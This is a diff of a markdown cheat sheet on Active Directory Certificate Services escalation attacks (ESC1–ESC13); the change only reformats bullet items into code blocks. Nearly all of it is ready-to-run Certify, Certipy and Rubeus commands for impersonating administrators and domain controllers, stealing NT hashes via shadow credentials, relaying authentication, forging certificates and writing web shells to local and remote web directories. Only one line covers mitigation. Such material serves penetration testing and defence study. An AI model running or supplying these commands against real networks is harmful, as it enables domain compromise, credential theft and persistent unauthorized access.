@@ -16,31 +16,31 @@
 
 #### 1) Use Certify.exe to see if there are any vulnerable templates
 
- - Certify.exe find /vulnerable
+    Certify.exe find /vulnerable
 
- - Certify.exe find /vulnerable /currentuser
+    Certify.exe find /vulnerable /currentuser
 
- - certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
+    certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
 
- - (&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
+    (&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
 
 #### 2) Use Certify, Certi or Certipy to request a Certificate and add an alternative name (user to impersonate)
 
- - Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
+    Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
 
- - certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'VULN_TEMPLATE' -upn 'administrator@corp.local'
+    certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'VULN_TEMPLATE' -upn 'administrator@corp.local'
 
 ## Note: If you get the error The NETBIOS connection with the remote host timed out. please rerun the command.
 
 #### 3) Use OpenSSL and convert the certificate, do not enter a password
 
- - openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider" -out cert.pfx
+    openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider" -out cert.pfx
 
 #### 4) Move the cert.pfx file to the target machine filesystem and request a TGT for the altname user using Rubeus
 
- - Rubeus.exe asktgt /user:domadmin /certificate:C:\Temp\cert.pfx /ptt
+    Rubeus.exe asktgt /user:domadmin /certificate:C:\Temp\cert.pfx /ptt
 
- - certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
+    certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
 
 
 ## WARNING! These certificates will still be usable even if the user or computer resets their password!
@@ -55,7 +55,7 @@
 
 #### 1) Find template
 
- - (&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
+    (&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
 
 #### 2) Request a certificate specifying the /altname as a domain admin like in ESC1
 
@@ -67,19 +67,19 @@
 
 #### 1) Request a certificate based on the vulnerable certificate template ESC3.
 
- - Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
+    Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
 
- - certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'
+    certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'
 
 #### 2) Use the Certificate Request Agent certificate (-pfx) to request a certificate on behalf of other another user
 
- - Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
+    Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
 
- - certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'
+    certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'
 
 #### 3) Use Rubeus with the certificate to authenticate as the other user
 
- - Rubeus.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
+    Rubeus.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
 
 # ESC4 - Access Control Vulnerabilities
 
@@ -91,31 +91,31 @@
 
 #### 1) Search for WriteProperty with value 00000000-0000-0000-0000-000000000000 using modifyCertTemplate
 
- - python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip DC_IP
+    python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip DC_IP
 
 #### 2) Add the ENROLLEE_SUPPLIES_SUBJECT (ESS) flag to perform ESC1
 
- - python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip DC_IP
+    python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip DC_IP
 
- - C:\>StandIn.exe --adcs --filter WebServer --ess --add (Add/remove ENROLLEE_SUPPLIES_SUBJECT flag from the WebServer template)
+    C:\>StandIn.exe --adcs --filter WebServer --ess --add (Add/remove ENROLLEE_SUPPLIES_SUBJECT flag from the WebServer template)
 
 #### 3) Perform ESC1 and then restore the value
 
- - python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip DC_IP
+    python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip DC_IP
 
 ### Using Certipy
 
 #### 1) Make template vulnerable to ESC1
 
- - certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old
+    certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old
 
 #### 2) Exploit ESC1
 
- - certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local
+    certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local
 
 #### 3) Restore config
 
- - certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
+    certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
 
 # ESC5 - Vulnerable PKI Object Access Control
 
@@ -137,21 +137,21 @@
 
 #### 1) Use Certify.exe to check for UserSpecifiedSAN flag state which refers to the EDITF_ATTRIBUTESUBJECTALTNAME2 flag.
 
- - Certify.exe cas
+    Certify.exe cas
 
- - Certify.exe find
+    Certify.exe find
 
 #### 2) Request a certificate for a template and add an altname, even though the default User template doesn't normally allow to specify alternative names
 
- - Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
+    Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
 
- - certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
+    certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
 
 ## Mitigation
 
 ### Remove the flag
 
- - certutil.exe -config "CA01.domain.local\CA01" -setreg "policy\EditFlags" -EDITF_ATTRIBUTESUBJECTALTNAME2
+    certutil.exe -config "CA01.domain.local\CA01" -setreg "policy\EditFlags" -EDITF_ATTRIBUTESUBJECTALTNAME2
 
 # ESC7 - Vulnerable Certificate Authority Access Control 
 
@@ -159,55 +159,55 @@
 
 #### 1) Detect CAs that allow low privileged users the ManageCA or Manage Certificates permissions
 
- - Certify.exe find /vulnerable
+    Certify.exe find /vulnerable
 
 #### 2) Change the CA settings to enable the SAN extension for all the templates under the vulnerable CA (ESC6)
 
- - Certify.exe setconfig /enablescan /restart
+    Certify.exe setconfig /enablescan /restart
 
 #### 3) Request the certificate with the desired SAN.
 
- - Certify.exe request /template:User /altname:super.adm
+    Certify.exe request /template:User /altname:super.adm
 
 #### 4) Grant approval if required or disable the approval requirement
 
- - Certify.exe issue /id:[REQUEST ID] (Grant)
+    Certify.exe issue /id:[REQUEST ID] (Grant)
 
- - Certify.exe setconfig /removeapproval /restart (Disable)
+    Certify.exe setconfig /removeapproval /restart (Disable)
 
 ## Alternate Method: Certify and PSPKI
 
 #### 1) # Request a certificate that will require an approval
 
- - Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
+    Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
 
 #### 2) Use PSPKI module to approve the request
 
- - Import-Module PSPKI
+    Import-Module PSPKI
 
- - Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest
+    Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest
 
 #### 3) Download the certificate
 
- - Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
+    Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
 
 ## Alternate Method: From ManageCA to RCE on ADCS server
 
 #### 1) Get the current CDP list. Useful to find remote writable shares:
 
- - Certify.exe writefile /ca:SERVER\ca-name /readonly
+    Certify.exe writefile /ca:SERVER\ca-name /readonly
 
 #### 2) Write an aspx shell to a local web directory:
 
- - Certify.exe writefile /ca:SERVER\ca-name /path:C:\Windows\SystemData\CES\CA-Name\shell.aspx
+    Certify.exe writefile /ca:SERVER\ca-name /path:C:\Windows\SystemData\CES\CA-Name\shell.aspx
 
 #### 3) Write the default asp shell to a local web directory:
 
- - Certify.exe writefile /ca:SERVER\ca-name /path:c:\inetpub\wwwroot\shell.asp
+    Certify.exe writefile /ca:SERVER\ca-name /path:c:\inetpub\wwwroot\shell.asp
 
 #### 4) Write a php shell to a remote web directory:
 
- - Certify.exe writefile /ca:SERVER\ca-name /path:\\remote.server\share\shell.php /input
+    Certify.exe writefile /ca:SERVER\ca-name /path:\\remote.server\share\shell.php /input
 
 # ESC8 - AD CS Relay Attack
 
@@ -218,21 +218,21 @@
 
 #### 1) Enumerate enabled HTTP ADCS Endponts
 
- - Certify.exe cas
+    Certify.exe cas
 
 #### 2) The msPKI-Enrollment-Servers property is used by enterprise Certificate Authorities (CAs) to store Certificate Enrollment Service (CES) endpoints.
 
- - certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
+    certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
 
 ## OR
 
- - Import-Module PSPKI
+    Import-Module PSPKI
 
- - Get-CertificationAuthority | select Name,Enroll* | Format-List *
+    Get-CertificationAuthority | select Name,Enroll* | Format-List *
 
 #### 3) Use certipy (Force authentication first with techniques like PetitPotam or SpoolSample)
 
- - certipy relay -ca ca.corp.local
+    certipy relay -ca ca.corp.local
 
 # ESC9 - No Security Extension
 
@@ -254,27 +254,27 @@
 
 ### Initially, Jane's hash is acquired using Shadow Credentials, thanks to John's GenericWrite:
 
- - certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
+    certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
 
 ### Subsequently, Jane's userPrincipalName is modified to Administrator, purposely omitting the @corp.local domain part:
 
- - certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
+    certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
 
 ### This modification does not violate constraints, given that Administrator@corp.local remains distinct as Administrator's userPrincipalName.
 
 ### Following this, the ESC9 certificate template, marked vulnerable, is requested as Jane:
 
- - certipy req -username jane@corp.local -hashes HASH -ca corp-DC-CA -template ESC9
+    certipy req -username jane@corp.local -hashes HASH -ca corp-DC-CA -template ESC9
 
 ### It's noted that the certificate's userPrincipalName reflects Administrator, devoid of any “object SID”.
 
 ### Jane's userPrincipalName is then reverted to her original, Jane@corp.local:
 
- - certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
+    certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
 
 ### Attempting authentication with the issued certificate now yields the NT hash of Administrator@corp.local. The command must include -domain DOMAIN due to the certificate's lack of domain specification:
 
- - certipy auth -pfx adminitrator.pfx -domain corp.local
+    certipy auth -pfx adminitrator.pfx -domain corp.local
 
 # ESC10 - Weak Certificate Mappings
 
@@ -298,23 +298,23 @@
 
 ### Initially, Jane's hash is retrieved using Shadow Credentials, exploiting the GenericWrite.
 
- - certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
+    certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
 
 ### Subsequently, Jane's userPrincipalName is altered to Administrator, deliberately omitting the @corp.local portion to avoid a constraint violation.
 
- - certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
+    certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
 
 ### Following this, a certificate enabling client authentication is requested as Jane, using the default User template.
 
- - certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes HASH
+    certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes HASH
 
 ### Jane's userPrincipalName is then reverted to its original, Jane@corp.local.
 
- - certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
+    certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
 
 ### Authenticating with the obtained certificate will yield the NT hash of Administrator@corp.local, necessitating the specification of the domain in the command due to the absence of domain details in the certificate.
 
- - certipy auth -pfx administrator.pfx -domain corp.local
+    certipy auth -pfx administrator.pfx -domain corp.local
 
 ## CASE 2
 
@@ -322,27 +322,27 @@
 
 ### Here, the goal is to compromise DC$@corp.local, starting with obtaining Jane's hash through Shadow Credentials, leveraging the GenericWrite.
 
- - certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
+    certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
 
 ### Jane's userPrincipalName is then set to DC$@corp.local.
 
- - certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
+    certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
 
 ### A certificate for client authentication is requested as Jane using the default User template.
 
- - certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes HASH
+    certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes HASH
 
 ### Jane's userPrincipalName is reverted to its original after this process.
 
- - certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
+    certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
 
 ### To authenticate via Schannel, Certipy’s -ldap-shell option is utilized, indicating authentication success as u:CORP\DC$.
 
- - certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
+    certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
 
 ### Through the LDAP shell, commands such as set_rbcd enable Resource-Based Constrained Delegation (RBCD) attacks, potentially compromising the domain controller.
 
- - certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
+    certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
 
 ### This vulnerability also extends to any user account lacking a userPrincipalName or where it does not match the sAMAccountName, with the default Administrator@corp.local being a prime target due to its elevated LDAP privileges and the absence of a userPrincipalName by default.
 
@@ -352,7 +352,7 @@
 
 ### You can use certipy to enumerate if Enforce Encryption for Requests is Disabled and certipy will show ESC11 Vulnerabilities.
 
- - certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
+    certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
 
 ## Note: For domain controllers, we must specify -template in DomainController.
 
@@ -370,9 +370,9 @@
 
 #### 1) In first, you need to obtain the CA certificate (this is public) and then:
 
- - certutil -addstore -user my CA_certificate_file (Import it to the user store with CA certificate
+    certutil -addstore -user my CA_certificate_file (Import it to the user store with CA certificate
 
- - certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my CA_Common_Name (Associated with the private key in the YubiHSM2 device)
+    certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my CA_Common_Name (Associated with the private key in the YubiHSM2 device)
 
 #### 2) Finally, use the certutil -sign command to forge a new arbitrary certificate using the CA certificate and its private key.
 
@@ -392,5 +392,5 @@
 
 ### All it need to do just specify the template, it will get a certificate with OIDToGroupLink rights.
 
- - certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
+    certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
 
